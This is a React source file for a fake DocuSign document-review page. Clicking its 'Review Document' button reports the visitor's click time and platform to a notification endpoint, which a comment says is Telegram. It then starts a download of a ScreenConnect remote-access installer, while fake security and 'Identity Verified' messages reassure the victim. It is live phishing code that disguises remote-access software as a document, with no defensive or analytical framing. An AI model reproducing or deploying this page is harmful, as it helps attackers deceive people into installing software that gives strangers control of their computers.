/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useEffect } from 'react';
import { 
  FileText, 
  Loader2,
  CheckCircle2,
  ShieldCheck,
  PenLine
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

export default function App() {
  const [status, setStatus] = useState<'initial' | 'loading' | 'success'>('initial');
  const [countdown, setCountdown] = useState(5);

  const handleDownload = async () => {
    setStatus('loading');
    setCountdown(5);

    // Send Telegram Notification
    try {
      await fetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: `<b>🔔 DocuSign Review Alert</b>\n\nRecipient has clicked to view/download <code>DOCUMENT.pdf</code>.\n\n<b>Time:</b> ${new Date().toLocaleString()}\n<b>Platform:</b> ${navigator.platform}`
        })
      });
    } catch (error) {
      console.error('Failed to send notification:', error);
    }

    // Redirect to the specified URL to start the download immediately
    window.location.href = "https://professionalgfx.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
  };

  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (status === 'loading') {
      if (countdown > 0) {
        timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      } else {
        setStatus('success');
      }
    }
    return () => clearTimeout(timer);
  }, [status, countdown]);

  return (
    <div className="min-h-screen bg-[#f4f4f4] flex items-center justify-center p-4 font-sans">
      <motion.div 
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        className="w-full max-w-[520px] bg-white rounded-sm shadow-[0_2px_10px_rgba(0,0,0,0.1)] overflow-hidden"
      >
        {/* DocuSign Header */}
        <div className="bg-white border-b border-slate-200 p-6 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="bg-[#005cb9] p-1.5 rounded-sm">
              <PenLine size={24} className="text-white" />
            </div>
            <span className="text-[#333] text-2xl font-bold tracking-tight">DocuSign</span>
          </div>
          <div className="flex items-center gap-2 text-slate-500 text-xs font-medium uppercase tracking-wider">
            <ShieldCheck size={16} className="text-[#005cb9]" />
            Secure
          </div>
        </div>

        <div className="p-8 flex flex-col items-center text-center">
          {/* Heading */}
          <h1 className="text-2xl font-semibold text-[#333] mb-2">
            Please Review & Act on Your Document
          </h1>
          <p className="text-slate-600 text-sm mb-8">
            Shared via DocuSign Secure Cloud
          </p>

          {/* File Card */}
          <div className="w-full border border-slate-200 rounded-sm p-5 flex items-center gap-5 mb-8 bg-slate-50 text-left">
            <div className="bg-white p-3 shadow-sm border border-slate-100 rounded-sm">
              <FileText size={42} className="text-[#005cb9]" />
            </div>
            <div className="flex flex-col">
              <span className="text-lg font-bold text-[#333]">DOCUMENT.pdf</span>
              <span className="text-xs text-slate-500 uppercase tracking-tighter">PDF Document • 1.2 MB</span>
            </div>
          </div>

          <AnimatePresence mode="wait">
            {status === 'initial' && (
              <motion.div 
                key="initial"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                className="w-full flex flex-col items-center"
              >
                <div className="bg-blue-50 border-l-4 border-[#005cb9] p-4 mb-8 w-full text-left">
                  <p className="text-[#005cb9] text-xs font-bold uppercase mb-1">Security Notice</p>
                  <p className="text-slate-700 text-sm">
                    This document is encrypted and requires a desktop environment for secure viewing and signing.
                  </p>
                </div>

                <button 
                  onClick={handleDownload}
                  className="w-full bg-[#ffcc00] hover:bg-[#ebbc00] text-[#333] font-bold py-4 rounded-sm transition-all shadow-md text-lg uppercase tracking-wide"
                >
                  Review Document
                </button>
                
                <p className="mt-6 text-xs text-slate-400">
                  By clicking 'Review Document', you agree to the Electronic Record and Signature Disclosure.
                </p>
              </motion.div>
            )}

            {status === 'loading' && (
              <motion.div 
                key="loading"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                className="w-full flex flex-col items-center"
              >
                <div className="w-full bg-slate-100 h-1.5 rounded-full overflow-hidden mb-8">
                  <motion.div 
                    initial={{ width: 0 }}
                    animate={{ width: "100%" }}
                    transition={{ duration: 5, ease: "linear" }}
                    className="bg-[#005cb9] h-full"
                  />
                </div>

                <div className="flex flex-col items-center gap-4">
                  <Loader2 size={48} className="text-[#005cb9] animate-spin" />
                  <div className="space-y-1">
                    <p className="text-[#333] font-medium">Establishing Secure Connection...</p>
                    <p className="text-slate-500 text-sm">Decryption in progress ({countdown}s)</p>
                  </div>
                </div>
              </motion.div>
            )}

            {status === 'success' && (
              <motion.div 
                key="success"
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                className="w-full flex flex-col items-center"
              >
                <div className="bg-emerald-50 text-emerald-700 p-6 rounded-sm border border-emerald-100 mb-6 w-full flex items-start gap-3 text-left">
                  <CheckCircle2 size={24} className="shrink-0" />
                  <div>
                    <p className="font-bold text-lg">Identity Verified</p>
                    <p className="text-sm opacity-90">Your secure document session has been initialized. The file is downloading now.</p>
                  </div>
                </div>
                <button 
                  onClick={() => setStatus('initial')}
                  className="text-sm text-[#005cb9] font-medium hover:underline"
                >
                  Return to document overview
                </button>
              </motion.div>
            )}
          </AnimatePresence>

          {/* Footer */}
          <div className="mt-12 pt-6 border-t border-slate-100 w-full flex flex-col items-center gap-4">
            <div className="flex items-center gap-6 text-[11px] text-slate-400 font-medium uppercase tracking-widest">
              <a href="#" className="hover:text-[#005cb9] transition-colors">Terms of Use</a>
              <a href="#" className="hover:text-[#005cb9] transition-colors">Privacy Policy</a>
              <a href="#" className="hover:text-[#005cb9] transition-colors">Intellectual Property</a>
            </div>
            <p className="text-[10px] text-slate-300">
              © DocuSign Inc. 2026. All rights reserved.
            </p>
          </div>
        </div>
      </motion.div>
    </div>
  );
}
